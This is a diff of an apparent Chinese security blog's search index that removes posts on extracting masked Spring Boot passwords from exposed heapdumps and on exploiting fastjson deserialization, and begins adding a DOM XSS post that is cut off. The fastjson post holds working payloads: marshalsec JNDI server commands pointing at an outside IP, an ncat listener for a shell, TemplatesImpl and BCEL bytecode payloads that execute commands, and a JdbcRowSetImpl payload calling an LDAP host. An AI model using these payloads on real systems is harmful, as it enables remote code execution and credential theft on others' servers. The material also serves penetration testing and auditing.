@@ -49,137 +49,6 @@
       </tags>
   </entry>
   <entry>
-    <title>MAT 查找 spring heapdump 中的密码明文</title>
-    <url>/2020/08/25/SpringBootHeapdump/</url>
-    <content><![CDATA[<h2 id="前景"><a href="#前景" class="headerlink" title="前景"></a>前景</h2><p>访问 /env 接口时，spring actuator 会将一些带有敏感关键词 (如 password、secret) 的属性名对应的属性值用 <strong>**</strong> 号替换，以达到脱敏的效果。<br>在目标既不出网，/jolokia 接口又没有合适的 MBean 或者不支持 POST 请求的情况下，很多获取被星号脱敏的密码的明文的方法就失效了。<br>这时候就可以利用 Eclipse Memory Analyzer 工具来分析 /heapdump 或 /actuator/heapdump 接口下载的 jvm heap 信息，查找密码明文。</p>
-<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>1 直接下载<strong><a href="http://xx.xx.xx.xx/heapdump" target="_blank" rel="noopener">http://xx.xx.xx.xx/heapdump</a></strong> 或者<strong><a href="http://xx.xx.xx.xx/actuator/heapdump" target="_blank" rel="noopener">http://xx.xx.xx.xx/actuator/heapdump</a></strong> (spring2.x 修改了路径)</p>
-<p>2 这时候就可以利用 Eclipse Memory Analyzer 工具来分析 /heapdump 或 /actuator/heapdump 接口下载的 jvm heap 信息，查找密码明文</p>
-<p>3 使用<a href="https://www.o2oxy.cn/wp-content/uploads/2020/05/MemoryAnalyzer.zip" target="_blank" rel="noopener"> Eclipse Memory Analyzer</a> 直接打开下载的 heapdump 文件，点击 OQL 标签，在查询框中输入,再点击感叹号运行下列语句。前者Spring1.x 后者Spring2.x</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select * from org.springframework.web.context.support.StandardServletEnvironment</span><br><span class="line">或者</span><br><span class="line">select * from java.util.Hashtable$Entry x WHERE (toString(x.key).contains(&quot;password&quot;))</span><br></pre></td></tr></table></figure>
-<p>4 成功查询到密码，结合/env页面泄漏的信息可以知道是jdbc还是邮箱的密码等<br><img src="https://mwebkeyi.oss-cn-beijing.aliyuncs.com/2020/08/25/15983217624960.jpg" alt="-w1187"></p>
-<h2 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h2><p>1 select语句中的关键字password替换为其他mail关键字进行fuzz</p>
-<p>2 heapdump 泄漏的反序列化点是否可以被我们黑盒利用</p>
-<p>3 可以结合/env页面泄漏的信息猜测其他敏感内容rce，比如sso的ak和sk等</p>
-<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://fanyibo2009.github.io/" target="_blank" rel="noopener">欢迎查看无尾熊blog</a><br><a href="http://vulsee.com/archives/vulsee_2020/0807_11841.html" target="_blank" rel="noopener">spring boot 获取被星号脱敏的密码的明文</a><br><a href="https://mp.weixin.qq.com/s/YirHAXg3VZXA3Znj4L6xSw" target="_blank" rel="noopener">xray社区记一次信息泄漏到RCE</a></p>
-]]></content>
-      <categories>
-        <category>代码</category>
-      </categories>
-      <tags>
-        <tag>黑盒测试</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>fastjson黑盒测试与白盒审计</title>
-    <url>/2020/08/03/fastjson/</url>
-    <content><![CDATA[<h2 id="简介与漏洞史"><a href="#简介与漏洞史" class="headerlink" title="简介与漏洞史"></a>简介与漏洞史</h2><p>文章首发<a href="https://xz.aliyun.com/t/7104" target="_blank" rel="noopener">先知</a></p>
-<pre><code>java处理JSON数据有三个比较流行的类库，gson(google维护)、jackson、以及今天的主角fastjson，
-fastjson是阿里巴巴一个开源的json相关的java library，
-地址在这里，https://github.com/alibaba/fastjson，
-Fastjson可以将java的对象转换成json的形式，也可以用来将json转换成java对象，效率较高，被广泛的用在web服务以及android上，
-它的JSONString（）方法可以将java的对象转换成json格式，同样通过parseObject方法可以将json数据转换成java的对象.</code></pre><h3 id="fastjson漏洞历史"><a href="#fastjson漏洞历史" class="headerlink" title="fastjson漏洞历史"></a>fastjson漏洞历史</h3><p><strong>fastjson-1.2.24</strong><br>(fastjson接受的JSON可以通过<code>@type</code>字段来指定该JSON应当还原成何种类型的对象，在反序列化的时候方便操作)<br><strong>fastjson-1.248以下</strong><br>(从而导致checkAutoType在检测是否为黑名单的时候绕了过去，因为上一步将com.sun.rowset.JdbcRowSetImpl放入了mapping中，checkAutoType中使用TypeUtils.getClassFromMapping(typeName)去获取class不为空，从而绕过了黑名单检测)<br><strong>fastjson-1.2.60以下</strong><br>(在此版本以下，字符串中包含\x转义字符时可以造成dos漏洞)</p>
-<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="本地测试环境"><a href="#本地测试环境" class="headerlink" title="本地测试环境"></a>本地测试环境</h3><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200113210627-8213791a-3605-1.jpg" alt=""><br>    本地的版本java版本为1.8.0_181<br>   fastjson版本为1.2.24<br>   tomcat 版本为 7</p>
-<p> 然而从JDK 6u45、7u21开始，java.rmi.server.useCodebaseOnly 的默认值就是true。当该值为true时，将禁用自动加载远程类文件，仅从CLASSPATH和当前VM的java.rmi.server.codebase 指定路径加载类文件。使用这个属性来防止客户端VM从其他Codebase地址上动态加载类，增加了RMI ClassLoader的安全性。</p>
-<p><strong>安全版本</strong><br><code>JDK</code>（ 8u121, 7u131, 6u141 ）<br><code>RMI</code>(JDK 6u132, 7u122, or 8u113 )</p>
-<h3 id="fastjson两种利用方式-出网或者不能出网"><a href="#fastjson两种利用方式-出网或者不能出网" class="headerlink" title="fastjson两种利用方式 - 出网或者不能出网"></a>fastjson两种利用方式 - 出网或者不能出网</h3><p><strong>1.服务器出网</strong><br>   使用<code>jndi</code>注入<br>-<code>ldap
--</code>rmi<br> ** 2.服务器不能出网**<br>   直接本地反序列化<br>-<code>BasicDataSource</code>(tomcat-dbcp:7.x, tomcat-dbcp:9.x, commons-dbcp:1.4)<br>-<code>TemplatesImpl</code></p>
-<h4 id="出网"><a href="#出网" class="headerlink" title="出网"></a>出网</h4><p>  <code>jndi</code>利用，其中分为rmi或者ldap,使用ldap限制比rmi小</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rmi利用</span><br><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer &quot;http:&#x2F;&#x2F;x.x.x.x&#x2F;#Poc&quot; 9999</span><br><span class="line"></span><br><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer &quot;http:&#x2F;&#x2F;40.73.6.221:8080&#x2F;#Poc&quot; 9999</span><br><span class="line"></span><br><span class="line">python -m SimpleHTTPServer 80</span><br><span class="line">ncat –lvvp 9998</span><br><span class="line">Burp发送poc</span><br></pre></td></tr></table></figure>
-<p><strong>图三是获取shell</strong><br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200113210628-82a86de0-3605-1.jpg" alt=""></p>
-<h4 id="不能出网"><a href="#不能出网" class="headerlink" title="不能出网"></a>不能出网</h4><p><strong>1.直接反序列化-_bytecodes直接反序列化Poc</strong></p>
-<pre><code>JSON.parseObject(input, Object.class, Feature.SupportNonPublicField);com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl中_bytecodes却是私有属性，_name也是私有域，所以在parseObject的时候需要设置Feature.SupportNonPublicField，这样_bytecodes字段才会被反序列化。_tfactory这个字段在TemplatesImpl既没有get方法也没有set方法而大部分的开发可能用用JSON.parse(input)就了事儿了，同时使用了parseObject和Feature.SupportNonPublicField设置的估计不多。所以说实际环境中挖掘fastjson的这个漏洞应该是可遇不可求</code></pre><blockquote>
-<p>利用代码如下：</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;,&quot;_bytecodes&quot;:[&quot;poc.class_base64&quot;],&#39;_name&#39;:&#39;a.b&#39;,&#39;_tfactory&#39;:&#123; &#125;,&quot;_outputProperties&quot;:&#123;&#125;,&quot;_name&quot;:&quot;a&quot;,&quot;_version&quot;:&quot;1.0&quot;,&quot;allowedProtocols&quot;:&quot;all&quot;&#125;</span><br></pre></td></tr></table></figure>
-
-<p>具体Poc.java代码如下</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line">import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line">import com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line">import java.io.IOException;</span><br><span class="line"></span><br><span class="line">public class Poc extends AbstractTranslet &#123;</span><br><span class="line">public Poc() throws IOException &#123;</span><br><span class="line">        Runtime.getRuntime().exec(&quot;open &#x2F;System&#x2F;Applications&#x2F;Calculator.app&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    @Override</span><br><span class="line">    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    @Override</span><br><span class="line">    public void transform(DOM document, com.sun.org.apache.xml.internal.serializer.SerializationHandler[] haFndlers) throws TransletException &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        Poc t &#x3D; new Poc();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>首先编译poc得到字节码，然后用pyhton进行编码生成byte后的代码</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import base64</span><br><span class="line">fin &#x3D; open(r&quot;Poc.class&quot;, &quot;rb&quot;)</span><br><span class="line">fout &#x3D; open(r&quot;en1.txt&quot;, &quot;w&quot;)</span><br><span class="line">s &#x3D; base64.encodestring(fin.read()).replace(&quot;\n&quot;, &quot;&quot;)</span><br><span class="line">fout.write(s)</span><br><span class="line">fin.close()</span><br><span class="line">fout.close()</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>Poc1.class进行base64并且要替换换行’\n’, 后代码如下</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">yv66vgAAADQAJgoABwAXCgAYABkIABoKABgAGwcAHAoABQAXBwAdAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACkV4Y2VwdGlvbnMHAB4BAAl0cmFuc2Zvcm0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWBwAfAQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYHACABAApTb3VyY2VGaWxlAQALcG9jMTExLmphdmEMAAgACQcAIQwAIgAjAQAMdG91Y2ggL3RtcC8xDAAkACUBAAZQb2MxMTEBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQATamF2YS9pby9JT0V4Y2VwdGlvbgEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAE2phdmEvbGFuZy9FeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEABQAHAAAAAAAEAAEACAAJAAIACgAAAC4AAgABAAAADiq3AAG4AAISA7YABFexAAAAAQALAAAADgADAAAACQAEAAoADQALAAwAAAAEAAEADQABAA4ADwABAAoAAAAZAAAABAAAAAGxAAAAAQALAAAABgABAAAADgABAA4AEAACAAoAAAAZAAAAAwAAAAGxAAAAAQALAAAABgABAAAAEQAMAAAABAABABEACQASABMAAgAKAAAAJQACAAEAAAAJuwAFWbcABlexAAAAAQALAAAACgACAAAAFAAIABUADAAAAAQAAQAUAAEAFQAAAAIAFg&#x3D;&#x3D;</span><br></pre></td></tr></table></figure>
-
-
-<blockquote>
-<p>最终poc</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;,&quot;_bytecodes&quot;:[&quot;yv66vgAAADQAJgoABwAXCgAYABkIABoKABgAGwcAHAoABQAXBwAdAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACkV4Y2VwdGlvbnMHAB4BAAl0cmFuc2Zvcm0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWBwAfAQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYHACABAApTb3VyY2VGaWxlAQAIUG9jLmphdmEMAAgACQcAIQwAIgAjAQAob3BlbiAvU3lzdGVtL0FwcGxpY2F0aW9ucy9DYWxjdWxhdG9yLmFwcAwAJAAlAQADUG9jAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAE2phdmEvaW8vSU9FeGNlcHRpb24BADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABNqYXZhL2xhbmcvRXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAUABwAAAAAABAABAAgACQACAAoAAAAuAAIAAQAAAA4qtwABuAACEgO2AARXsQAAAAEACwAAAA4AAwAAAAsABAAMAA0ADQAMAAAABAABAA0AAQAOAA8AAQAKAAAAGQAAAAQAAAABsQAAAAEACwAAAAYAAQAAABEAAQAOABAAAgAKAAAAGQAAAAMAAAABsQAAAAEACwAAAAYAAQAAABYADAAAAAQAAQARAAkAEgATAAIACgAAACUAAgACAAAACbsABVm3AAZMsQAAAAEACwAAAAoAAgAAABkACAAaAAwAAAAEAAEAFAABABUAAAACABY&#x3D;&quot;],&#39;_name&#39;:&#39;a.b&#39;,&#39;_tfactory&#39;:&#123; &#125;,&quot;_outputProperties&quot;:&#123;&#125;,&quot;_name&quot;:&quot;a&quot;,&quot;_version&quot;:&quot;1.0&quot;,&quot;allowedProtocols&quot;:&quot;all&quot;&#125;</span><br></pre></td></tr></table></figure>
-
-
-<p><strong>关键调用链如下</strong><br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200113210630-83b6d546-3605-1.jpg" alt=""></p>
-<p><strong>命令执行如下</strong><br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200113210631-84d0a466-3605-1.jpg" alt=""></p>
-<p><strong>2.直接反序列化-dbcp</strong><br>依赖<br><code>commons-dbcp.jar</code><br>org.apache.commons.dbcp.BasicDataSource<br>Spring在第三方依赖包中包含了两个数据源的实现类包，其一是Apache的DBCP.</p>
-<p>依赖<code>tomcat-dbcp.jar</code>(tomcat部署自带)<br>org.apache.tomcat.dbcp.dbcp.BasicDataSource</p>
-<p>运行Poc1得到<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200113210632-85132278-3605-1.jpg" alt=""></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$adR$ddj$TA$Y$3d$93$a4$d9d$bbmMc$5bS$ffZ$b5$9az$d1A$f0F$ob$b1$8a$85$d4$96$s$u$d2$ab$c9fLGvg$c2$ecD$82$P$e4$bd7V$U$7c$A$lJ$fcv$8dI$c0$80$V$dce$e6$9b9$7b$ce$f7$bb$df$7f$7c$f9$G$e0$3en$fb$f0$b0$e6$e3$Sj$r$ac$a7$f6$b2$87$x$3e$e6$b0$e6$e1$wC$f1$a1$d2$ca$3db$c8$d7$b7_2$U$9e$98$aedXj$w$z_$M$e2$8e$b4m$d1$89$I$f1$9f$OC$d9w$ca$e8$c4$c35$86$b2$b3B$to$8c$8d$Z$3e$d4$9b$a1$89y2$d0$dc$d8$k$X$7d$R$9eJ$3e$U$91$d0$5ci$t$ad$W$R$l$s$91$L$f9$de$e1Ac$s9$8e$s$d4$ae$8b$f9$5e$fb$60w$a8$92$7d$82$843$f6$ef$a2DZ$r$o$f5$5eZ$de$g$jE$9a$ees$a1$bb$91$b4$8d$b4$3a$fbo$89$9e$fc$87$a0$k$aeSWc$a14$c3j$fd$a4$f9V$bc$T$9c$e2$f5x$cbY$a5$7b$Ze$83$fa$db2$D$h$cag$wmv$e9$c8$84$3b$v3$40$Je$P$9b$Bn$e0$sC$e0$cc$m$3c$dd$e0$$$ee$f3$7b$Bna$8b$e6F$5c$86$c7$e7$ad$cb$O$b4S$b1$e4$bb$9d$84$s$Y$bav$3a$c6H$3a$86j$96$9a2$7c$ffp$3ck$86$H$e7u$fc$db$d1$94$b6$3a$vv$K$adL$d0$e3_$c9P$f5$3d$e9$c6$97$95$fav$f3$PN$83$ba$u$87$92J$bdS$9f$d1$c4$v$e8$c8$9aP$sI$D$9b$f4$93$7bH$9f$CX$daH$e4$e0$d3m$87$y$p$bbx$f7$M$ec3r$cb$f9O$u$bc$faH$I$c3$7c$8a$pO$fb$3c$a9$C$y$d0$h$8c$3c$y$d0Z$c4$S$ed$a9$97Z$86$92f$o$yfn$x$Z$ed$c2$uXJ$cb$cf$a2$ad$8e$fdV$u$b3eTG$82$z$b29$b2$e5$af$98$7b$7d$86bs$o$f4$b3$P5$we$7d$y$beHk$85$ce9$ac$fe$E$i$98$ab$f0$f4$D$A$A</span><br></pre></td></tr></table></figure>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200113210632-8558b478-3605-1.jpg" alt=""></p>
-<p>最终poc</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;&#125;,&#123;&quot;@type&quot;: &quot;org.apache.tomcat.dbcp.dbcp.BasicDataSource&quot;,&quot;driverClassLoader&quot;: &#123;&quot;@type&quot;: &quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;&#125;,&quot;driverClassName&quot;: &quot;$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$7d$91$cfN$C1$Q$c6$bf$c2$$$c5$ba$C$o$e2$3fD$b8$n$HI$bcJ$bc$YM$d0U$P$Q$8e$seidq$dd$dd$y$8b$f1$8d$3csQ$e3$c1$H$f0$a1$8c$b3$F5$5el$d2$99$ce7$9d_$a7$ed$c7$e7$db$3b$80C$d4$F$b2$d801$li$81Mlql$L$98$d8$e1$a8p$ec2d$da$ae$ef$c6$c7$M$e9$c6$7e$9f$c18$J$86$8a$no$bb$be$ba$9a$de$PT$d4$93$D$8f$94$a2$j8$d2$eb$cb$c8M$e2$85h$c4$pw$c2$c0$ed$89$a7Tx$c4$90m$3b$de$82$c7$u_$b3$c7$f2A$b6$3c$e9$df$b6$3a$7e$ac$a2h$g$c6jx$fa$e8$a80v$D$9f$wV$ba$b1t$ee$$e$a8$91$d4$j$83$e8$G$d3$c8Qgnr$84$d0$e8$83$84ca$J$82$a3j$a1$82$3d$86$ea$ffl$L5$I$GS$d73$U$7ew_$P$c6$ca$89$ffH$bdQ$a4$e4$90$$$d48O$5e$n$lF$ae$l$eb$cez$91t$U$ea$e0$f4$94$c9H$81$rm$90$5d$a6$a8E$9e$917$9b$_$603$9d$b6$c8f$b4H$97$pk$cd7$m$87$3c$f9$y$K$3f$c57$g$G$e4KH$bd$c2xB$f6$a2$f9$8c$ccL$8b$Z$3a$c5DZ$e3$caH$fe$d0$m$8dkU$d0$wG$a8o$bc$a0$dc$w$8a$U$ad$d1$e4Hu8J$G$r$d6uG$e5$_$H$X$vT$R$C$A$A&quot;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;&#125;,&#123;&quot;@type&quot;: &quot;org.apache.tomcat.dbcp.dbcp.BasicDataSource&quot;,&quot;driverClassLoader&quot;: &#123;&quot;@type&quot;: &quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;&#125;,&quot;driverClassName&quot;: &quot;$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$7d$91$cfN$C1$Q$c6$bf$c2$$$c5$ba$C$o$e2$3fD$b8$n$HI$bcJ$bc$YM$d0U$P$Q$8e$seidq$dd$dd$y$8b$f1$8d$3csQ$e3$c1$H$f0$a1$8c$b3$F5$5el$d2$99$ce7$9d_$a7$ed$c7$e7$db$3b$80C$d4$F$b2$d801$li$81Mlql$L$98$d8$e1$a8p$ec2d$da$ae$ef$c6$c7$M$e9$c6$7e$9f$c18$J$86$8a$no$bb$be$ba$9a$de$PT$d4$93$D$8f$94$a2$j8$d2$eb$cb$c8M$e2$85h$c4$pw$c2$c0$ed$89$a7Tx$c4$90m$3b$de$82$c7$u_$b3$c7$f2A$b6$3c$e9$df$b6$3a$7e$ac$a2h$g$c6jx$fa$e8$a80v$D$9f$wV$ba$b1t$ee$$e$a8$91$d4$j$83$e8$G$d3$c8Qgnr$84$d0$e8$83$84ca$J$82$a3j$a1$82$3d$86$ea$ffl$L5$I$GS$d73$U$7ew_$P$c6$ca$89$ffH$bdQ$a4$e4$90$$$d48O$5e$n$lF$ae$l$eb$cez$91t$U$ea$e0$f4$94$c9H$81$rm$90$5d$a6$a8E$9e$917$9b$_$603$9d$b6$c8f$b4H$97$pk$cd7$m$87$3c$f9$y$K$3f$c57$g$G$e4KH$bd$c2xB$f6$a2$f9$8c$ccL$8b$Z$3a$c5DZ$e3$caH$fe$d0$m$8dkU$d0$wG$a8o$bc$a0$dc$w$8a$U$ad$d1$e4Hu8J$G$r$d6uG$e5$_$H$X$vT$R$C$A$A&quot;&#125;</span><br></pre></td></tr></table></figure>
-
-<h2 id="黑白盒测试方法"><a href="#黑白盒测试方法" class="headerlink" title="黑白盒测试方法"></a>黑白盒测试方法</h2><h3 id="利用链及版本"><a href="#利用链及版本" class="headerlink" title="利用链及版本"></a>利用链及版本</h3><table>
-<thead>
-<tr>
-<th>Payload</th>
-<th>PayloadType</th>
-<th>Dependencies</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>BasicDataSource</td>
-<td>local</td>
-<td>tomcat-dbcp:7.x, tomcat-dbcp:9.x, commons-dbcp:1.4</td>
-</tr>
-<tr>
-<td>JdbcRowSetImpl</td>
-<td>jndi</td>
-<td>Fastjson 1.2.47及以下</td>
-</tr>
-<tr>
-<td>TemplatesImp</td>
-<td>local</td>
-<td>need Feature.SupportNonPublicField</td>
-</tr>
-</tbody></table>
-<h3 id="黑盒测试"><a href="#黑盒测试" class="headerlink" title="黑盒测试"></a>黑盒测试</h3><p>  1.目标站点如果报错的话一般使用不闭合{花括号或者多添加”双引号来进行测试</p>
-<p>  2.fastjson与jackson区别，如果请求包中的 json 如下:<br>    {“name”:”S”, “age”:21}<br>    追加一个随机 key ,修改 json 为<br>    {“name”:”S”, “age”:21,”agsbdkjada__ss_d”:123}<br>    这里 fastjson 是不会报错的, Jackson 因为强制 key 与 javabean 属性对齐,只能 少不能多 key,<br>    所以会报错,服务器的响应包中多少会有异常回显</p>
-<p>  3.dos检测 dos<br>    {“a:”\x  看返回时间</p>
-<p>  4.如果是json字符串中name字段存在反序列化<br>    {“id”:”1”,”name”:”wangwei”}那么poc就是<br>    {“id”:”1”,”name”:{“@type”:”java.lang.Class”,”val”:”com.sun.rowset.JdbcRowSetImpl”},”x”:{“@type”:”com.sun.rowset.JdbcRowSetImpl”,”dataSourceName”:”ldap://fatjaon.tuq75v.ceye.io”,”autoCommit”:true}}</p>
-<p><strong>小tips</strong><br>1.在测试过程中发现只要回显比较慢，或者感觉卡顿都有可能是正在执行命令，所以比较慢<br>2.poc.java文件用低版本的java环境编译，因为java是向下兼容的，防止目标环境加载的时候运行报错，最好是jdk1.6</p>
-<h3 id="白盒审计函数"><a href="#白盒审计函数" class="headerlink" title="白盒审计函数"></a>白盒审计函数</h3><p>   1.查看fastjson jar包是否小于1.2.48<br>    2.审查以下函数<br>    JSON.parseObject（）<br>    JSONObject.parseObject（）<br>    JSON.parseAarry（）</p>
-<h3 id="黑名单"><a href="#黑名单" class="headerlink" title="黑名单"></a>黑名单</h3><p><code>config.checkAutoType(typeName)</code></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bsh</span><br><span class="line">com.mchange</span><br><span class="line">com.sun.</span><br><span class="line">java.lang.Thread</span><br><span class="line">java.net.Socket</span><br><span class="line">java.rmi</span><br><span class="line">javax.xml</span><br><span class="line">org.apache.bcel</span><br><span class="line">org.apache.commons.beanutils</span><br><span class="line">org.apache.commons.collections.Transformer</span><br><span class="line">org.apache.commons.collections.functors</span><br><span class="line">org.apache.commons.collections4.comparators</span><br><span class="line">org.apache.commons.fileupload</span><br><span class="line">org.apache.myfaces.context.servlet</span><br><span class="line">org.apache.tomcat</span><br><span class="line">org.apache.wicket.util</span><br><span class="line">org.codehaus.groovy.runtime</span><br><span class="line">org.hibernate</span><br><span class="line">org.jboss</span><br><span class="line">org.mozilla.javascript</span><br><span class="line">org.python.core</span><br><span class="line">org.springframework</span><br></pre></td></tr></table></figure>
-<p><a href="https://github.com/alibaba/fastjson/commit/d52085ef54b32dfd963186e583cbcdfff5d101b5" target="_blank" rel="noopener">https://github.com/alibaba/fastjson/commit/d52085ef54b32dfd963186e583cbcdfff5d101b5</a></p>
-<p><strong>参考</strong></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;c0ny1&#x2F;FastjsonExploit</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;shengqi158&#x2F;fastjson-remote-code-execute-poc</span><br><span class="line">https:&#x2F;&#x2F;www.cnblogs.com&#x2F;hac425&#x2F;p&#x2F;9800288.html</span><br><span class="line">https:&#x2F;&#x2F;blog.csdn.net&#x2F;yaofeino1&#x2F;article&#x2F;details&#x2F;76377080</span><br><span class="line">https:&#x2F;&#x2F;blog.riskivy.com&#x2F;无损检测fastjson-dos漏洞以及盲区分fastjson与jackson组件&#x2F;</span><br><span class="line">https:&#x2F;&#x2F;kingx.me&#x2F;Restrictions-and-Bypass-of-JNDI-Manipulations-RCE.html</span><br></pre></td></tr></table></figure>]]></content>
-      <categories>
-        <category>反编译</category>
-      </categories>
-      <tags>
-        <tag>代码审计</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>批量反编译class</title>
-    <url>/2017/05/26/fanbianiyi/</url>
-    <content><![CDATA[<p><strong>使用<a href="http://the.bytecode.club/fernflower.jar" target="_blank" rel="noopener">fernflower.jar</a> 批量反编译class</strong></p>
-<p><strong>批量反编译</strong></p>
-<ul>
-<li>首先把工程的所有class压缩成classes.zip</li>
-<li>java -jar fernflower.jar classes.zip zzCode/  （新建zzCode文件夹） </li>
-</ul>
-]]></content>
-      <categories>
-        <category>反编译</category>
-      </categories>
-      <tags>
-        <tag>java反编译工具</tag>
-        <tag>fernflower.jar</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>java代码审计思路</title>
     <url>/2020/08/24/CodeAudit/</url>
     <content><![CDATA[<p>常见的审计思路<br>1.查看目录结构，查看配置文件，判断框架信息<br>2.查看使用的类库包是否安全<br>3.filter、controller<br>4.数据查询<br>5.危险函数审计<br>6.查看xml配置的数据库信息和文件信息<br>7.黑盒测试对应白盒测试功能点</p>
@@ -298,6 +167,174 @@ web.xml
       </categories>
       <tags>
         <tag>java代码审计</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>domxss的一点研究</title>
+    <url>/2021/02/22/DOMXSS/</url>
